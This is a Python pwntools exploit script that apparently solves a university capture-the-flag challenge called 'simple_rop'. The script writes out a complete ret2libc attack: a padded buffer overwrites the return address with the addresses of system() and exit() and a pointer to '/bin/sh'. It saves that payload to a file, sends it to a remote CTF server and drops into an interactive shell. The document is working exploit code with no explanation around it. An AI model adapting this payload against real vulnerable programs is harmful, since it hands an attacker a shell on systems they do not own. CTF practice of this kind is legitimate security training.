#!/usr/bin/python3

from pwn import *

DEBUG = False

if DEBUG:
    r = process('./simple_rop')

else:
    r = remote('ctf-fsi.fe.up.pt', 7008)

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

Y = 28
system_addr = 0xf7e10420           # The address of system()
content[Y:Y + 4] = (system_addr).to_bytes(4, byteorder='little')

Z = Y + 4
exit_addr = 0xf7e02f80             # The address of exit()
content[Z:Z + 4] = (exit_addr).to_bytes(4, byteorder='little')

X = Z + 4
sh_addr = system_addr + 0x149F32   # The address of "/bin/sh"
content[X:X + 4] = (sh_addr).to_bytes(4, byteorder='little')

W = X + 4
exit_code = 0x00
content[W:W + 4] = (exit_code).to_bytes(4, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

r.recvuntil(b"flag!")
r.sendline(content)
r.interactive()
